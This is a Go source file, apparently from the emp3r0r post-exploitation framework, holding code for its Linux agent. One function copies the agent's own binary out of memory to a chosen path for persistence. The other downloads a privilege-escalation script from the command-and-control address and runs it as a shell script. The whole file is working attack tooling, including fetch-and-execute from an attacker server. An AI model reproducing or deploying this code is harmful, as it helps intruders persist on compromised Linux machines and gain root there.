//go:build linux
// +build linux

package agent

import (
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// Copy current executable to a new location
func CopySelfTo(dest_file string) (err error) {
	elf_data, err := util.FindEmp3r0rELFInMem()
	if err != nil {
		return fmt.Errorf("FindEXEInMem: %v", err)
	}

	// mkdir -p if directory not found
	dest_dir := strings.Join(strings.Split(dest_file, "/")[:len(strings.Split(dest_file, "/"))-1], "/")
	if !util.IsExist(dest_dir) {
		err = os.MkdirAll(dest_dir, 0o700)
		if err != nil {
			return
		}
	}

	// overwrite
	if util.IsExist(dest_file) {
		os.RemoveAll(dest_file)
	}

	return os.WriteFile(dest_file, elf_data, 0o755)
}

// runLPEHelper runs helper scripts to give you hints on how to escalate privilege
func runLPEHelper(method, checksum string) (out string) {
	log.Printf("Downloading LPE script from %s", def.CCAddress+method)
	var scriptData []byte
	scriptData, err := SmartDownload("", method, "", checksum)
	if err != nil {
		return "Download error: " + err.Error()
	}

	// run the script
	log.Printf("Running LPE helper %s", method)
	out, err = RunShellScript(scriptData, os.Environ())
	if err != nil {
		return fmt.Sprintf("Run LPE helper %s failed: %s %v", method, out, err)
	}

	return out
}
